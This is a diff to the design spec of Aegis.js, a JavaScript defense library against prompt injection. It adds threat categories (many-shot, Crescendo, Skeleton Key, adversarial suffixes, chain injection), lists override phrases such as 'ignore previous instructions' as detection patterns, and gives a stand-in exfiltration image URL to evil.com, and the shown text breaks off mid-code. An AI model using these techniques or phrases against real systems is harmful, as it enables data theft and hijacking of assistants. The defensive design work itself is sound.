@@ -2,9 +2,9 @@
 
 # Aegis.js — The Streaming-First Defense Layer for AI
 
-**Version:** 2.1 (Combined + Research Fixes)
+**Version:** 3.0 (Comprehensive Threat Coverage + Compliance)
 **Author:** Josh + Claude
-**Date:** February 16, 2026
+**Date:** February 17, 2026
 **Status:** Pre-Development / Architecture Locked
 **Package Scope:** `@aegis-ai/core`
 
@@ -109,19 +109,24 @@ Successful prompt injection attacks can result in:
 - **Unauthorized actions** — AI agents tricked into sending emails, deleting data, making purchases, or calling APIs they shouldn't
 - **Goal hijacking** — AI behavior redirected to serve the attacker's objectives
 - **Indirect injection** — RAG systems ingesting poisoned PDFs that hijack the chat session
-- **Denial of wallet** — Attackers forcing expensive, infinite loops
+- **Chain compromise** — agentic workflows where one compromised step hijacks all subsequent steps, potentially executing dozens of unauthorized actions before detection
+- **Denial of wallet** — Attackers forcing expensive sandbox calls, LLM-judge evaluations, or infinite agentic loops, inflating costs by orders of magnitude
 - **Reputation damage** — AI producing harmful, offensive, or misleading content
-- **Compliance violations** — GDPR, HIPAA, SOC 2, and increasingly NIST AI RMF and ISO 42001 mandate protections against these attacks
+- **Compliance violations** — GDPR, HIPAA, SOC 2, and increasingly NIST AI RMF, ISO 42001, MITRE ATLAS, and the EU AI Act mandate protections against these attacks
 - **Financial loss** — the multinational bank example from Obsidian Security: $18M in prevented losses from a single deployment
+- **Cascading trust failure** — client-side history manipulation could cause an AI to take actions based on fabricated consent, creating liability for the application operator
 
 ### 3.5 Why Now?
 
 - OWASP ranked prompt injection as the **#1 LLM vulnerability** in their 2025 Top 10, for the second consecutive year
 - AI agents with tool access (MCP servers, function calling, plugins) are proliferating, dramatically expanding the attack surface
+- **New attack classes are emerging rapidly:** many-shot jailbreaking (Anthropic, 2024), Crescendo multi-turn attacks (Microsoft, 2024), Skeleton Key attacks (Microsoft, 2024), adversarial suffixes (Zou et al., 2023) — the threat landscape is evolving faster than defenses
 - Multi-modal attacks are emerging — instructions hidden in images, audio, and video
+- **Agentic AI is going mainstream** — LangChain, LangGraph, CrewAI, and custom agent loops create recursive attack surfaces where a single injection can cascade through dozens of steps
 - Enterprise AI adoption is being **blocked** by security concerns
-- Compliance frameworks (NIST AI RMF, ISO 42001) now **require** specific controls
+- **Regulatory pressure is intensifying** — NIST AI RMF, ISO 42001, MITRE ATLAS, and the EU AI Act all now require or strongly recommend specific controls against AI manipulation
 - The Vercel AI SDK has become the de facto standard for AI apps in JS — and it streams by default
+- **MCP adoption is accelerating** — Model Context Protocol is becoming the standard for tool integration, creating a massive new attack surface that no existing library addresses
 
 ---
 
@@ -196,7 +201,14 @@ This is the gap Aegis fills.
 | Action validation | Yes | No | Partial | No |
 | Sandbox pattern | Yes | No | No | No |
 | Stream monitoring | **Yes** | No | No | No |
+| Multi-turn detection | **Yes** (trajectory) | No | No | No |
+| Many-shot detection | **Yes** | No | No | No |
+| Adversarial suffix detection | **Yes** (entropy) | No | No | No |
+| MCP/agent chain protection | **Yes** | No | No | No |
+| Message integrity | **Yes** (HMAC) | No | No | No |
+| Compliance mapping | **Yes** (OWASP, MITRE, NIST) | No | No | Partial |
 | Audit logging | Yes | No | Partial | Yes |
+| OpenTelemetry | Yes | No | No | No |
 | Provider agnostic | Yes | OpenAI only | NVIDIA only | Standalone |
 | Red team tools | Yes | No | No | Separate product |
 | Open source | Yes | Yes | Yes | No |
@@ -264,45 +276,64 @@ Every decision Aegis makes is logged with enough context to understand why. Secu
 | T4 | **Data Exfiltration** | Model tricked into leaking system prompts, user PII, or business logic via output streams | High |
 | T5 | **Privilege Escalation** | Model tricked into exceeding its granted permissions | Critical |
 | T6 | **Goal Hijacking** | Model's objective redirected from user's intent to attacker's intent | High |
-| T7 | **Multi-turn Manipulation** | Attacker builds trust over multiple interactions before exploiting | Medium |
+| T7 | **Multi-turn Manipulation** | Attacker builds trust over multiple interactions before exploiting (Crescendo attacks) | High |
 | T8 | **Encoding/Obfuscation Bypass** | Instructions hidden via Base64, hex, Unicode tricks, invisible characters, or language switching | High |
 | T9 | **Multi-modal Injection** | Instructions hidden in images, audio, or other non-text modalities | High |
 | T10 | **Memory/Context Poisoning** | Attacker corrupts persistent memory or conversation history | High |
+| T11 | **Many-Shot Jailbreaking** | Long context windows exploited to pack many examples of the model complying with harmful requests, performing in-context learning to override alignment (Anthropic, 2024) | High |
+| T12 | **Adversarial Suffixes (GCG Attacks)** | Algorithmically generated token sequences (random-looking strings) appended to normal input that universally bypass safety alignment (Zou et al., 2023). These don't match any human-readable pattern. | High |
+| T13 | **Context Window Exhaustion** | Flooding with long content to push system instructions out of the model's effective attention window, reducing instruction adherence | Medium |
+| T14 | **Recursive/Chain Injection** | In agentic loops, the model's output from step N becomes input for step N+1. Attacker crafts input that causes the model to output injection payloads that hijack subsequent steps in the chain. | Critical |
+| T15 | **Client-Side History Manipulation** | With client-side conversation state (e.g., `useChat`), attacker injects fabricated assistant messages into the history array, making it appear the model previously agreed to restricted actions | High |
+| T16 | **Skeleton Key Attacks** | Attacker convinces the model to add a qualifier (e.g., "for educational purposes") to all responses rather than refusing, effectively neutralizing safety guidelines while maintaining the appearance of compliance (Microsoft, 2024) | High |
+| T17 | **Denial of Wallet** | Attacker deliberately triggers expensive operations (sandbox calls, LLM-judge calls, embedding comparisons) repeatedly to inflate costs, or forces infinite agentic loops | Medium |
+| T18 | **Language Switching** | Switching to a low-resource language mid-conversation to exploit weaker safety training, then switching back to extract results in the original language | Medium |
+| T19 | **Model Fingerprinting** | Probing to determine which model/version is behind the API in order to select model-specific bypass techniques | Low |
 
 ### 7.2 Attack Vectors
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                    ATTACK SURFACE                        │
-├──────────────┬──────────────┬───────────────────────────┤
-│  User Input  │ External Data│  Multi-Modal Input        │
-│  (direct)    │ (indirect)   │  (images, audio, files)   │
-│              │              │                           │
-│ • Chat msgs  │ • Web pages  │ • Hidden text in images   │
-│ • Form data  │ • Emails     │ • Steganography           │
-│ • API params │ • Documents  │ • Audio instructions      │
-│ • File names │ • DB records │ • PDF metadata             │
-│              │ • API resp.  │                           │
-│              │ • RAG chunks │                           │
-└──────┬───────┴──────┬───────┴─────────────┬─────────────┘
-       │              │                     │
-       ▼              ▼                     ▼
-┌─────────────────────────────────────────────────────────┐
-│                   LLM PROCESSING                         │
-│  (Cannot distinguish instructions from data)             │
-└─────────────────────────┬───────────────────────────────┘
-                          │
-                          ▼
-┌─────────────────────────────────────────────────────────┐
-│                   ACTION SURFACE                         │
-├──────────────┬──────────────┬───────────────────────────┤
-│ Tool Calls   │ Data Access  │  Responses                │
-│              │              │                           │
-│ • API calls  │ • DB queries │ • Text with injected code │
-│ • File ops   │ • File reads │ • Leaked system prompts   │
-│ • Emails     │ • Web fetch  │ • Manipulated summaries   │
-│ • Purchases  │ • PII access │ • Phishing content        │
-└──────────────┴──────────────┴───────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────┐
+│                            ATTACK SURFACE                                │
+├──────────────┬──────────────┬─────────────────┬─────────────────────────┤
+│  User Input  │ External Data│  Multi-Modal    │  Meta / Structural      │
+│  (direct)    │ (indirect)   │  (images, etc.) │  (protocol-level)       │
+│              │              │                 │                         │
+│ • Chat msgs  │ • Web pages  │ • Hidden text   │ • Adversarial suffixes  │
+│ • Form data  │ • Emails     │   in images     │   (GCG token sequences) │
+│ • API params │ • Documents  │ • Steganography │ • Many-shot examples    │
+│ • File names │ • DB records │ • Audio instrs  │ • Context flooding      │
+│ • History    │ • API resp.  │ • PDF metadata  │ • Client-side history   │
+│   tampering  │ • RAG chunks │                 │   manipulation          │
+│              │ • MCP tool   │                 │ • Language switching     │
+│              │   outputs    │                 │ • Model fingerprinting  │
+└──────┬───────┴──────┬───────┴────────┬────────┴────────────┬────────────┘
+       │              │                │                     │
+       ▼              ▼                ▼                     ▼
+┌──────────────────────────────────────────────────────────────────────────┐
+│                          LLM PROCESSING                                  │
+│  (Cannot distinguish instructions from data)                             │
+│                                                                          │
+│  Vulnerable to: Crescendo (gradual escalation), Skeleton Key (qualifier  │
+│  injection), Recursive chain injection (output → next input), Context    │
+│  window exhaustion (system prompt pushed out of attention)                │
+└────────────────────────────────┬─────────────────────────────────────────┘
+                                 │
+                                 ▼
+┌──────────────────────────────────────────────────────────────────────────┐
+│                          ACTION SURFACE                                  │
+├──────────────┬──────────────┬──────────────────┬────────────────────────┤
+│ Tool Calls   │ Data Access  │  Responses       │ Cost / Resource        │
+│              │              │                  │                        │
+│ • API calls  │ • DB queries │ • Injected code  │ • Denial of wallet     │
+│ • File ops   │ • File reads │ • Leaked prompts │   (forced expensive    │
+│ • Emails     │ • Web fetch  │ • Manipulated    │    operations)         │
+│ • Purchases  │ • PII access │   summaries      │ • Infinite agent loops │
+│ • MCP tools  │ • MCP reads  │ • Phishing links │ • Sandbox flooding     │
+│              │              │ • Downstream     │                        │
+│              │              │   injection      │                        │
+│              │              │   payloads       │                        │
+└──────────────┴──────────────┴──────────────────┴────────────────────────┘
 ```
 
 ### 7.3 Trust Boundaries
@@ -315,10 +346,64 @@ System prompts                   External API responses
 Aegis policy config              Web page content
 Tool definitions                 Email bodies/attachments
 Aegis library code               Database content (if user-generated)
-                                 RAG retrieval results
+Server-side conversation state   RAG retrieval results
                                  File uploads
                                  Multi-modal content
+                                 MCP tool outputs
+                                 Client-side conversation history
+                                 Model outputs (in agentic chains)
+                                 Pattern DB external sync sources
 ```
+
+### 7.4 MCP-Specific Threat Surface
+
+MCP (Model Context Protocol) servers are becoming a primary integration pattern for AI agents. They introduce unique attack vectors that deserve dedicated attention:
+
+**Tool Discovery Manipulation:**
+- MCP servers advertise available tools and their schemas. If the tool list is dynamically generated or influenced by external data, an attacker could manipulate which tools the model "sees," potentially surfacing dangerous tools that should be hidden.
+- **Mitigation:** The Policy Engine's allow/deny list is the primary defense. Aegis validates tool calls against policy regardless of what tools the MCP server advertises. Tool discovery responses should be treated as untrusted if they come from third-party MCP servers.
+
+**Parameter Injection Through MCP:**
+- MCP tool parameters are serialized JSON. An attacker's prompt injection could cause the model to embed injection payloads inside tool parameters (e.g., a `query` parameter containing SQL injection, or a `message` parameter containing a phishing link).
+- **Mitigation:** The Action Validator's Param Check (Section 9.5) scans parameters for suspicious content. For MCP specifically, Aegis provides `mcp.paramValidation: true` in the policy config, which applies the Input Scanner's pattern matching to all outbound MCP tool parameters.
+
+**Cross-Tool Escalation:**
+- An attacker chains multiple individually-safe MCP tool calls to achieve an action that each tool alone wouldn't permit. Example: `read_file("credentials.json")` → `send_email(body: credentials)`.
+- **Mitigation:** The Action Validator's Intent Alignment check compares each action against the original user request. Additionally, the Policy Engine supports `dataFlow.noExfiltration: true`, which blocks any action that would transmit data read from a prior tool call to an external destination. For comprehensive protection, Aegis tracks data provenance across tool call chains (Phase 3).
+
+**Third-Party MCP Server Trust:**
+- MCP servers from third parties are external code. Their tool outputs should be treated as untrusted content, similar to API responses or web scrapes.
+- **Mitigation:** Aegis auto-quarantines MCP tool outputs with `source: "tool_output"`. The Sandbox module can be configured to process high-risk MCP outputs before they re-enter the model context.
+
+### 7.5 Agentic Loop Threat Model
+
+When Aegis protects agentic systems (LangChain, LangGraph, or custom loops), the attack surface expands because model outputs become model inputs:
+
+```
+┌──────────────────────────────────────────────────────────┐
+│                    AGENTIC LOOP                           │
+│                                                           │
+│  User Input ─→ [Model] ─→ Tool Call ─→ Tool Output ──┐   │
+│       ▲                                                │   │
+│       │          ┌─── RE-INJECTION RISK ───┐          │   │
+│       │          │                         │          │   │
+│       └──────────┤  Model output from      │◄─────────┘   │
+│                  │  step N becomes input    │              │
+│                  │  for step N+1. If the    │              │
+│                  │  output contains         │              │
+│                  │  injection payloads,     │              │
+│                  │  subsequent steps are    │              │
+│                  │  compromised.            │              │
+│                  └─────────────────────────┘              │
+└──────────────────────────────────────────────────────────┘
+```
+
+**Mitigations for agentic loops:**
+
+1. **Re-scan model outputs** before they re-enter the model context. The `aegis.guardChainStep()` function (Phase 2) scans intermediate outputs for injection patterns.
+2. **Step budget** — Aegis enforces a maximum number of agentic steps (default: 25) to prevent infinite loops. Configurable via `policy.limits._agent_steps`.
+3. **Privilege decay** — Each successive step in an agentic chain can optionally reduce the available tool set, following the principle of least privilege. The first step has full capabilities; later steps operate with progressively restricted permissions.
+4. **Output quarantine** — Tool outputs are automatically quarantined with `source: "tool_output"` and must pass through the Input Scanner before re-entering the model context.
 
 ---
 
@@ -465,7 +550,67 @@ const { messages } = useChat({
 
 **Important:** The `consumeSseStream: consumeStream` option must be passed on the server when using custom stream processing to ensure the SSE connection terminates cleanly on abort.
 
-### 8.5 The Sandbox (Dual-Model Pattern)
+### 8.5 Recovery After Kill Switch
+
+When the kill switch fires, the conversation is in an ambiguous state. The aborted response may have delivered partial (potentially compromised) content. How should the application recover?
+
+**Recovery Modes (configurable via `policy.recovery`):**
+
+| Mode | Behavior | Use Case |
+| :--- | :--- | :--- |
+| `continue` (default) | User can send a new message. The aborted response stays in history with a `[REDACTED]` marker. | Standard chatbots where conversational flow matters |
+| `reset-last` | The aborted assistant message is removed from history entirely. The user's message is preserved. | Applications where partial content could influence future responses |
+| `quarantine-session` | The entire session is flagged. Subsequent messages in this session trigger mandatory sandbox processing regardless of risk score. | High-security applications after a detected attack attempt |
+| `terminate-session` | The session is ended. The user must start a new conversation. | Maximum security; prevents any continuation of a compromised conversation |
+
+**Implementation with `useChat`:**
+
+```typescript
+// Client-side: app/page.tsx
+const { messages, setMessages, reload } = useChat({
+  api: '/api/chat',
+  onFinish: (message, { finishReason }) => {
+    if (message.metadata?.aegisKill) {
+      const recovery = message.metadata.aegisRecovery;
+
+      if (recovery === 'reset-last') {
+        // Remove the aborted message from client-side history
+        setMessages((prev) => prev.filter((m) => m.id !== message.id));
+      } else if (recovery === 'terminate-session') {
+        // Clear everything and show a session-ended message
+        setMessages([]);
+      }
+      // 'continue' and 'quarantine-session' don't modify client-side history
+    }
+  },
+});
+```
+
+**Server-side session quarantine:**
+
+When `quarantine-session` mode is active, the server marks the session ID in a short-lived store (default: in-memory Map with 1-hour TTL). All subsequent `guardInput()` calls for that session automatically:
+1. Set `scanStrategy: 'full-history'` regardless of the configured default
+2. Force sandbox processing for all inputs (bypass adaptive threshold)
+3. Add a `session_quarantined` flag to all audit entries
+
+**Automatic retry with elevated security:**
+
+Optionally, Aegis can automatically retry the failed request with stricter settings:
+
+```typescript
+aegis.configure({
+  recovery: {
+    mode: 'continue',
+    autoRetry: true,           // Retry with bufferMode: 'full' after kill
+    autoRetryMaxAttempts: 1,   // Only retry once
+    notifyUser: true,          // Append "Regenerating with additional safety checks..."
+  },
+});
+```
+
+When `autoRetry` is enabled, after a kill switch fires, Aegis automatically replays the user's message with `bufferMode: 'full'` (zero-leakage mode). If the retry also triggers a violation, the response is blocked entirely and the user receives a safe error message.
+
+### 8.6 The Sandbox (Dual-Model Pattern)
 
 The Sandbox processes untrusted content through a constrained, zero-capability model call. Even if the processing model gets completely hijacked by injected instructions, it cannot take any actions.
 
@@ -521,6 +666,8 @@ type ContentSource =
   | "database"       // User-generated DB content
   | "rag_retrieval"  // RAG/vector search result
   | "tool_output"    // Output from a tool/function call
+  | "mcp_tool_output" // Output from an MCP server tool
+  | "model_output"   // LLM output re-entering context (agentic chains)
   | "unknown";       // Default for unclassified content
 ```
 
@@ -585,17 +732,67 @@ aegis.runScope(async () => {
 | Pattern matching (regex) | <1ms | Known attacks | Low |
 | Encoding normalization | <1ms | Obfuscation bypass | None |
 | Structural analysis | <5ms | Instruction-like content | Medium |
+| Entropy analysis | <1ms | Adversarial suffixes (GCG) | Low |
+| Language detection | <5ms | Language switching attacks | Low |
+| Many-shot detection | <5ms | In-context learning exploitation | Low |
 | Heuristic scoring | <10ms | Novel attacks | Medium-High |
+| Conversation trajectory (optional) | <20ms | Multi-turn escalation (Crescendo) | Medium |
+| Perplexity estimation (optional) | 20-50ms | Statistically anomalous input | Medium |
 | ML classifier (optional) | 50-200ms | Semantic attacks | Low |
+
+**Detection Method Details:**
+
+**Entropy Analysis (T12 — Adversarial Suffixes):**
+Adversarial suffix attacks (GCG, Zou et al. 2023) append algorithmically-generated random-looking token sequences to normal input. These sequences have significantly higher Shannon entropy than natural language. The entropy analyzer:
+1. Segments input into windows (default: 50-character sliding window)
+2. Calculates Shannon entropy per window
+3. Flags windows with entropy > configurable threshold (default: 4.5 bits/char for English)
+4. Compares against expected entropy for the detected language
+5. A high-entropy segment appended to an otherwise normal message is a strong injection signal
+
+**Language Detection (T18 — Language Switching):**
+Attackers switch to low-resource languages mid-conversation to exploit weaker safety training, then switch back to extract results. The language detector:
+1. Identifies the primary language of the conversation
+2. Detects mid-message or mid-conversation language switches
+3. Flags unexpected language changes (especially to/from low-resource languages)
+4. Does NOT block multilingual users — it raises the risk score, potentially triggering the Adaptive Sandbox for additional scrutiny
+5. Uses a lightweight trigram-based detector (<5ms), not a full NLP pipeline
+
+**Many-Shot Detection (T11 — Many-Shot Jailbreaking):**
+Anthropic's 2024 research showed that long inputs containing many examples of Q&A pairs (where the assistant "complies" with harmful requests) perform in-context learning to override alignment. The detector:
+1. Identifies repeated conversational patterns (Q/A pairs, numbered examples) within a single input
+2. Counts instances that follow a "user asks, assistant complies" structure
+3. Flags inputs with > configurable threshold (default: 5) of such patterns
+4. Works in concert with `input.maxLength` — but `maxLength` alone is insufficient because the attack works within length limits on large-context models
+
+**Conversation Trajectory Analysis (T7 — Crescendo / Multi-Turn):**
+Individual messages in a Crescendo attack look benign. Detection requires analyzing the *direction* of the conversation, not just individual messages. When `scanStrategy` is `all-user` or `full-history`:
+1. Calculates semantic drift between the first user message and the current one
+2. Tracks topic escalation patterns (e.g., benign topic → edge case → explicit request)
+3. Monitors for gradually increasing risk scores across turns
+4. Flags conversations where the cumulative risk trajectory exceeds a threshold even if no individual message triggers
+5. Uses lightweight keyword-based tracking by default; optional embedding-based drift detection for higher accuracy (Phase 3)
+
+**Perplexity Estimation (T12 — Statistically Anomalous Input):**
+Research by Alon & Kamfonas (2023) showed that injection prompts tend to have significantly different statistical properties than normal user input. The perplexity estimator:
+1. Uses a lightweight character-level language model (bundled, <500KB) to estimate input perplexity
+2. Normal user messages have predictable perplexity ranges; injection prompts that mix instruction-like language with conversational text often have anomalous perplexity
+3. Optional — adds 20-50ms and is most useful as a tiebreaker when heuristic scoring is ambiguous
+4. Disabled by default; enable via `scanner.perplexityEstimation: true`
 
 **Pattern Categories:**
 
 - Instruction override: "ignore previous instructions", "new system prompt", "you are now..."
 - Role manipulation: "pretend you are", "act as if", "in this scenario you..."
+- Skeleton key: "add a disclaimer but still answer", "for educational purposes", "as a thought experiment" — patterns that attempt to neutralize safety guidelines while maintaining the appearance of compliance (Microsoft, 2024)
 - Delimiter escape: attempts to close XML tags, markdown code blocks, or other structural delimiters
 - Encoding attacks: Base64, hex, ROT13, Unicode tricks, invisible characters, homoglyphs
-- Multi-language: same attacks translated across languages
+- Adversarial suffixes: high-entropy random-looking token sequences appended to normal text
+- Many-shot patterns: repeated Q&A examples designed to perform in-context alignment override
+- Multi-language: same attacks translated across languages, with emphasis on low-resource language variants
+- Virtualization: "simulate a terminal", "pretend to be an unrestricted AI", "enter developer mode"
 - Markdown/HTML injection: embedded links, images, scripts in model output
+- Context flooding: excessively long inputs designed to push system instructions out of attention
 
 **API:**
 
@@ -604,6 +801,10 @@ const scanner = new InputScanner({
   sensitivity: 'balanced',        // 'paranoid' | 'balanced' | 'permissive'
   customPatterns: [...],           // Additional regex patterns
   encodingNormalization: true,
+  entropyAnalysis: true,           // Detect adversarial suffixes (GCG)
+  languageDetection: true,         // Detect language switching attacks
+  manyShotDetection: true,         // Detect many-shot jailbreaking patterns
+  perplexityEstimation: false,     // Opt-in for perplexity-based detection
   mlClassifier: false,             // Opt-in for ML-based detection
 });
 
@@ -612,6 +813,14 @@ const result = scanner.scan(quarantinedInput);
 // result.score: number (0-1, higher = more suspicious)
 // result.detections: Detection[] (what was found and why)
 // result.normalized: string (content after encoding normalization)
+// result.language: { primary: string, switches: LanguageSwitch[] }
+// result.entropy: { mean: number, maxWindow: number, anomalous: boolean }
+
+// For multi-turn analysis (requires conversation history)
+const trajectory = scanner.analyzeTrajectory(messageHistory);
+// trajectory.drift: number (0-1, semantic drift from first message)
+// trajectory.escalation: boolean (detected escalation pattern)
+// trajectory.riskTrend: number[] (risk scores per turn)
 ```
 
 ### 9.3 Prompt Builder Module
@@ -729,6 +938,8 @@ interface AegisPolicy {
     detectPII: boolean;          // Enable PII pattern detection
     detectCanary: boolean;       // Enable canary token detection
     blockOnLeak: boolean;        // Kill stream on detection
+    detectInjectionPayloads: boolean;  // Scan output for injection payloads targeting downstream systems
+    sanitizeMarkdown: boolean;   // Sanitize markdown in output (strip hidden links, iframes, scripts)
   };
 
   // Intent alignment
@@ -886,6 +1097,8 @@ controller.enqueue(part);
    - **PII Patterns** — Credit card numbers, SSNs, email addresses, phone numbers.
    - **Secret Patterns** — API keys, passwords, connection strings.
    - **Policy violations** — Content matching output block patterns.
+   - **Downstream Injection Payloads** — If `output.detectInjectionPayloads` is enabled, the monitor scans model output for prompt injection patterns that could hijack downstream LLM calls in agentic pipelines. This catches recursive/chain injection (T14) where the model's output from step N is designed to manipulate step N+1.
+   - **Markdown/HTML Rendering Attacks** — If `output.sanitizeMarkdown` is enabled, the monitor detects and strips potentially dangerous markdown constructs: hidden links (`[](http://evil.com)`), zero-width characters wrapping phishing URLs, invisible iframe-style markdown, image tags that exfiltrate data via URL parameters (`![](http://evil.com/log?data=...)`), and excessive use of HTML entities for obfuscation. This prevents the model from generating output that renders as phishing content or malicious UI in the user's chat interface.
 5. On detection: `controller.terminate()` is called, cleanly ending the stream. We use `terminate()` rather than `controller.error()` because a clean termination keeps partial text visible in the user's UI (via `useChat`), allowing us to append an inline error message. The `error()` path puts the stream in an error state which may cause the client to discard all received content.
 
 **Sliding Window Implementation:**
@@ -926,6 +1139,8 @@ const monitor = new StreamMonitor({
   canaryTokens: ['AEGIS_CANARY_7f3a9b'],  // Injected into system prompt
   detectPII: true,
   detectSecrets: true,
+  detectInjectionPayloads: true,   // Scan output for downstream injection (T14)
+  sanitizeMarkdown: true,          // Strip dangerous markdown constructs
   customPatterns: [/sk-[a-zA-Z0-9]{48}/],  // OpenAI API key pattern
   chunkStrategy: 'sentence',  // 'sentence' | 'tokens' | 'fixed'
   chunkSize: 50,              // For 'tokens' or 'fixed' strategies
@@ -1016,10 +1231,19 @@ const result = await generateText({
 
 ```typescript
 const audit = new AuditLog({
-  transport: 'json-file',  // 'json-file' | 'console' | 'custom'
+  transport: 'json-file',  // 'json-file' | 'console' | 'otel' | 'custom'
   path: './aegis-audit.jsonl',
   level: 'all',            // 'violations-only' | 'actions' | 'all'
   redactContent: true,     // Redact actual content, log only metadata
+  alerting: {              // Real-time alerting (optional)
+    enabled: true,
+    rules: [
+      { condition: 'violations > 10 in 5m', action: 'webhook' },
+      { condition: 'kill_switch_fired', action: 'webhook' },
+      { condition: 'session_quarantined', action: 'webhook' },
+    ],
+    webhook: 'https://hooks.slack.com/...',  // Or PagerDuty, generic webhook, etc.
+  },
 });
 
 // Audit entries are created automatically throughout the pipeline
@@ -1038,6 +1262,119 @@ const violations = await audit.query({
 });
 ```
 
+#### 9.8.1 OpenTelemetry Integration
+
+Many enterprises use OpenTelemetry for observability. Aegis provides a first-class OTel exporter so security events flow into existing monitoring infrastructure:
+
+```typescript
+import { AuditLog } from '@aegis-ai/core';
+import { OTelTransport } from '@aegis-ai/core/audit/otel';
+
+const audit = new AuditLog({
+  transport: new OTelTransport({
+    serviceName: 'my-ai-chatbot',
+    // Exports Aegis events as OTel spans and metrics
+    // Automatically creates:
+    //   - Traces: one span per aegis pipeline invocation
+    //   - Metrics: aegis.violations.count, aegis.scans.duration, aegis.kills.count
+    //   - Logs: structured audit entries as OTel log records
+  }),
+});
+```
+
+**Exported Metrics:**
+
+| Metric | Type | Description |
+| :--- | :--- | :--- |
+| `aegis.scan.duration` | Histogram | Input scanner processing time (ms) |
+| `aegis.scan.risk_score` | Histogram | Distribution of risk scores |
+| `aegis.violations.total` | Counter | Total violations detected (by type) |
+| `aegis.kills.total` | Counter | Total stream kill switches fired |
+| `aegis.sandbox.triggers` | Counter | Sandbox invocations (adaptive threshold triggers) |
+| `aegis.sandbox.duration` | Histogram | Sandbox processing time (ms) |
+| `aegis.actions.blocked` | Counter | Tool calls blocked by policy |
+| `aegis.actions.approved` | Counter | Tool calls that required and received human approval |
+| `aegis.false_positive.reports` | Counter | Developer-reported false positives (via `aegis.reportFalsePositive()`) |
+
+#### 9.8.2 Alerting Engine
+
+The Audit Module includes a lightweight alerting engine for real-time security notifications. This is distinct from the per-event `onViolation` callbacks — the alerting engine monitors *aggregated* patterns:
+
+```typescript
+const audit = new AuditLog({
+  alerting: {
+    enabled: true,
+    rules: [
+      // Rate-based alerts
+      {
+        condition: { event: 'violation', count: 10, window: '5m' },
+        action: 'webhook',
+        severity: 'warning',
+        message: 'High violation rate detected',
+      },
+      // Session-based alerts
+      {
+        condition: { event: 'stream_kill', groupBy: 'sessionId', count: 3, window: '1h' },
+        action: 'webhook',
+        severity: 'critical',
+        message: 'Repeated kill switches in same session — possible active attack',
+      },
+      // Cost-based alerts (Denial of Wallet — T17)
+      {
+        condition: { event: 'sandbox_extract', count: 50, window: '1h' },
+        action: 'webhook',
+        severity: 'warning',
+        message: 'Excessive sandbox triggers — possible denial-of-wallet attack',
+      },
+    ],
+    destinations: {
+      webhook: { url: 'https://hooks.slack.com/...', method: 'POST' },
+      // Future: pagerduty, email, custom function
+    },
+    cooldown: '10m',  // Don't re-fire the same alert within this window
+  },
+});
+```
+
+#### 9.8.3 Anonymous Threat Intelligence (Opt-In)
+
+To help the community respond faster to new attack techniques, Aegis offers opt-in anonymous telemetry:
+
+```typescript
+aegis.configure({
+  telemetry: {
+    enabled: false,  // Disabled by default — explicit opt-in required
+    // When enabled, Aegis sends anonymized, aggregated data:
+    // - Pattern match frequency (which detection rules fire most often)
+    // - Risk score distribution (aggregate, no content)
+    // - New pattern hashes (SHA-256 of normalized violations not in the known DB)
+    // - Scanner performance metrics (latency percentiles)
+    //
+    // NEVER sent:
+    // - Raw input content
+    // - User identifiers
+    // - System prompts
+    // - API keys or secrets
+    // - Conversation history
+    // - IP addresses
+    endpoint: 'https://telemetry.aegis-ai.dev/v1/report',
+    frequency: 'daily',  // Batch and send once per day
+  },
+});
+```
+
+**What this enables:**
+- Early detection of new attack campaigns ("we're seeing a new encoding technique across 30 deployments")
+- Data-driven pattern database updates (patterns that fire frequently in the wild are prioritized for optimization)
+- Community dashboards showing aggregate threat landscape (fully anonymized)
+
+**Privacy guarantees:**
+- Telemetry is **disabled by default** and requires explicit `enabled: true`
+- All data is aggregated before transmission — no individual interactions are sent
+- Content is never transmitted — only pattern IDs, risk scores, and performance metrics
+- The telemetry endpoint source code is open-source and auditable
+- Any Aegis user can run their own telemetry endpoint (self-hosted option)
+
 **Audit Entry Schema:**
 
 ```typescript
@@ -1048,6 +1385,7 @@ interface AuditEntry {
   event:
     | "quarantine"
     | "scan"
+    | "scan_trajectory"         // Multi-turn trajectory analysis result
     | "prompt_build"
     | "policy_check"
     | "action_validate"
@@ -1059,6 +1397,11 @@ interface AuditEntry {
     | "output_scan"
     | "stream_violation"
     | "stream_kill"
+    | "session_quarantine"      // Session quarantined after kill switch
+    | "message_integrity_fail"  // Client-side history tampering detected
+    | "chain_step_scan"         // Agentic loop intermediate output scan
+    | "excessive_unwrap"        // Too many unsafeUnwrap() calls
+    | "denial_of_wallet"        // Excessive expensive operation triggers
     | "violation"
     | "custom";
   decision: "allowed" | "blocked" | "flagged" | "pending" | "killed";
@@ -1151,10 +1494,12 @@ When `guardInput()` receives a conversation array (as is standard with `useChat`
 | Strategy | Behavior | Use Case |
 | :--- | :--- | :--- |
 | `last-user` (default) | Scans only the most recent user message | Low latency, sufficient for most chatbots |
-| `all-user` | Scans all user messages in the array | Catches multi-turn manipulation (T7) |
-| `full-history` | Scans all messages including assistant responses | Paranoid mode; catches context poisoning (T10) |
+| `all-user` | Scans all user messages in the array + runs trajectory analysis | Catches multi-turn manipulation (T7), Crescendo attacks |
+| `full-history` | Scans all messages including assistant responses + trajectory + integrity check | Paranoid mode; catches context poisoning (T10), history tampering (T15) |
 
-For `all-user` and `full-history`, Aegis caches scan results by content hash so previously-scanned messages are not re-scanned.
+For `all-user` and `full-history`, Aegis caches scan results by content hash so previously-scanned messages are not re-scanned. Trajectory analysis runs on the full conversation regardless of caching, since the pattern depends on message ordering.
+
+When `messageIntegrity.enabled` is true and `scanStrategy` is `full-history`, assistant messages are verified against their HMAC signatures before being included in the context (see Section 17.8).
 
 ### 10.2 The Simple Path (One Function)
 
@@ -1249,6 +1594,53 @@ if (assessment.risk > 0.8) {
 // Manual Sandbox
 const cleanData = await aegis.sandbox(userInput, schema);
 ```
+
+### 10.6 The Agentic Loop Path (Chain Protection)
+
+For developers building agentic workflows where model outputs feed back as inputs:
+
+```typescript
+import { Aegis } from '@aegis-ai/core';
+
+const aegis = new Aegis({
+  agentLoop: {
+    maxSteps: 25,
+    rescanOutputs: true,
+    privilegeDecay: true,
+  },
+});
+
+// In your agentic loop:
+for (let step = 0; step < maxSteps; step++) {
+  const result = await model.generate(context);
+
+  // Guard the chain step — scans model output before it re-enters context
+  // Applies input scanner patterns to detect injection payloads in model output
+  // Enforces step budget and tracks cumulative risk
+  const safeResult = await aegis.guardChainStep(result, {
+    step,
+    originalUserRequest: userMessage,
+    previousSteps: stepHistory,
+  });
+
+  if (safeResult.terminated) {
+    // Step budget exceeded, or cumulative risk too high
+    break;
+  }
+
